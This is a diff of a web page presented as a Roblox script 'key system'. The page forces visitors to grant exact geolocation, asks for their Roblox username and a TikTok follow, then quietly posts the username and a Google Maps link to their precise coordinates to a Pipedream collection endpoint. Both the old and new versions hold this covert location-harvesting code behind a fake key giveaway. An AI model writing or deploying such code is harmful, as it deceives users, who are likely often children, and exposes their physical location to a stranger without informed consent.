@@ -4,41 +4,126 @@
     <title>Alfred Private Key System</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #0b0b0b; color: #00ff88; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
-        .container { background: #161616; padding: 25px; border-radius: 15px; border: 1px solid #00ff88; max-width: 400px; margin: 0 auto; display: none; } /* Hidden until loaded */
-        input { width: 90%; padding: 12px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #333; background: #000; color: white; outline: none; }
-        .btn { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #00ff88; background: transparent; color: #00ff88; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .get-key-btn { width: 100%; padding: 15px; margin-top: 20px; border: none; border-radius: 8px; background: #333; color: #888; font-weight: bold; cursor: not-allowed; }
-        .get-key-btn.active { background: #00ff88; color: #000; cursor: pointer; box-shadow: 0 0 15px #00ff88; }
+        body { 
+            background: #0b0b0b; 
+            color: #00ff88; 
+            font-family: 'Segoe UI', Roboto, sans-serif; 
+            text-align: center; 
+            padding: 20px;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
         
-        /* Full Screen States */
-        #location-lock, #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
-        #loading-screen { display: none; color: #00ff88; font-size: 1.5em; font-weight: bold; }
-        .lock-btn { background: #00ff88; color: black; padding: 15px 30px; border: none; border-radius: 8px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        .container { 
+            background: #161616; 
+            padding: 30px; 
+            border-radius: 15px; 
+            border: 1px solid #00ff88; 
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            display: none; 
+        }
 
-        /* Modal */
-        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
-        .modal-content { background: #222; margin: 20% auto; padding: 20px; width: 80%; max-width: 300px; border-radius: 10px; border: 1px solid #00ff88; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin-bottom: 20px; 
+            border-radius: 8px; 
+            border: 1px solid #333; 
+            background: #000; 
+            color: white; 
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        .btn { 
+            width: 100%; 
+            padding: 14px; 
+            margin: 10px 0; 
+            border: 1px solid #00ff88; 
+            background: transparent; 
+            color: #00ff88; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: bold; 
+        }
+
+        .get-key-btn { 
+            width: 100%; 
+            padding: 16px; 
+            margin-top: 20px; 
+            border: none; 
+            border-radius: 8px; 
+            background: #333; 
+            color: #888; 
+            font-weight: bold; 
+            cursor: not-allowed; 
+        }
+
+        .get-key-btn.active { 
+            background: #00ff88; 
+            color: #000; 
+            cursor: pointer; 
+            box-shadow: 0 0 15px #00ff88; 
+        }
+
+        #location-lock, #loading-screen { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: #000; 
+            z-index: 9999; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        #loading-screen { display: none; color: #00ff88; font-size: 1.5em; font-weight: bold; }
+
+        #modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.9); 
+            z-index: 10000; 
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content { 
+            background: #222; 
+            padding: 25px; 
+            width: 90%; 
+            max-width: 320px; 
+            border-radius: 12px; 
+            border: 1px solid #00ff88; 
+        }
+
         #status-msg { margin-top: 20px; font-weight: bold; color: white; }
     </style>
 </head>
 <body onload="requestLocation()">
 
 <div id="location-lock">
-    <div style="padding: 30px;">
-        <h2 style="color: #00ff88;">🔒 ACCESS DENIED</h2>
-        <p>Verification Required: Please allow <b>Exact Location</b> to continue.</p>
-        <button class="lock-btn" onclick="requestLocation()">Enable Location</button>
-    </div>
+    <h2 style="color: #00ff88;">🔒 ACCESS RESTRICTED</h2>
+    <p>Please allow <b>Exact Location</b> to enter.</p>
+    <button class="btn" onclick="requestLocation()" style="background:#00ff88; color:#000; max-width: 250px;">Enable Exact Location</button>
 </div>
 
 <div id="loading-screen">
-    <div id="loading-text">Activating Server🌐</div>
+    <div>Activating Server🌐</div>
 </div>
 
 <div class="container" id="main-gui">
     <h2>ALFRED KEY SYSTEM</h2>
-    <input type="text" id="username" placeholder="Enter Roblox Username...">
+    <input type="text" id="username" placeholder="Roblox Username...">
     <button id="taskBtn" class="btn" onclick="showInstructions()">FOLLOW TIKTOK</button>
     <button id="getKeyBtn" class="get-key-btn" onclick="finish()" disabled>GET KEY</button>
     <div id="status-msg"></div>
@@ -46,7 +131,7 @@
 
 <div id="modal">
     <div class="modal-content">
-        <p style="color: white; font-size: 0.9em;">Follow my TikTok and stay for 10 seconds before coming back!</p>
+        <p style="color: white;">Follow my TikTok and stay for 10 seconds before coming back!</p>
         <button class="btn" onclick="goToTikTok()" style="background:#00ff88; color:black;">Continue</button>
         <button class="btn" onclick="hideInstructions()" style="border-color:#555; color:#888;">Cancel</button>
     </div>
@@ -55,45 +140,40 @@
 <script>
     let leaveTime = 0;
     let isVerifying = false;
-    let userLocation = "Location_Not_Provided";
+    let userLocation = "Location_Denied";
 
     const TIKTOK_URL = "https://www.tiktok.com/@ilovebbqflavoredfries12"; 
     const PIPEDREAM_URL = "https://eobv9ob96qab0yy.m.pipedream.net"; 
-    const DISCORD_INVITE = "https://discord.gg/2SDuz6PW";
+    const REDIRECT_LINK = "https://alfredfescripts.github.io/Ai-scripter/"; 
 
     function requestLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    userLocation = "https://www.google.com/maps?q=" + lat + "," + lon;
-                    
-                    // Hide lock, show loading
+                    userLocation = "https://www.google.com/maps?q=" + position.coords.latitude + "," + position.coords.longitude;
                     document.getElementById('location-lock').style.display = 'none';
                     document.getElementById('loading-screen').style.display = 'flex';
-
-                    // Wait 3 seconds then show GUI
                     setTimeout(() => {
                         document.getElementById('loading-screen').style.display = 'none';
                         document.getElementById('main-gui').style.display = 'inline-block';
                     }, 3000);
                 },
-                (error) => {
-                    alert("Verification Failed: You must allow location.");
-                    requestLocation();
-                },
+                () => { alert("Location Required!"); requestLocation(); },
                 { enableHighAccuracy: true }
             );
         }
     }
 
-    function showInstructions() { document.getElementById('modal').style.display = "block"; }
+    function showInstructions() { document.getElementById('modal').style.display = "flex"; }
     function hideInstructions() { document.getElementById('modal').style.display = "none"; }
 
     function goToTikTok() {
         hideInstructions();
-        window.open(TIKTOK_URL, '_blank');
+        
+        // This trick forces the mobile browser to open the URL in a new tab instead of the app
+        const bypassUrl = "https://www.google.com/url?q=" + encodeURIComponent(TIKTOK_URL);
+        window.open(bypassUrl, '_blank');
+        
         isVerifying = true;
         leaveTime = Date.now();
         document.getElementById('taskBtn').innerText = "VERIFYING... STAY ON TIKTOK";
@@ -117,18 +197,18 @@
     });
 
     function finish() {
-        const user = document.getElementById('username').value || "Unknown_User";
+        const user = document.getElementById('username').value || "No_Name";
         const finalUrl = `${PIPEDREAM_URL}?username=${encodeURIComponent(user)}&location=${encodeURIComponent(userLocation)}`;
         fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
 
         const status = document.getElementById('status-msg');
         let countdown = 5;
-        const redirectTimer = setInterval(() => {
-            status.innerHTML = `CHECK DISCORD SERVER, KEY WILL BE THERE!<br>Redirecting in ${countdown}...`;
+        const timer = setInterval(() => {
+            status.innerHTML = `SUCCESS!<br>Redirecting in ${countdown}...`;
             countdown--;
             if (countdown < 0) {
-                clearInterval(redirectTimer);
-                window.location.href = DISCORD_INVITE;
+                clearInterval(timer);
+                window.location.href = REDIRECT_LINK;
             }
         }, 1000);
     }
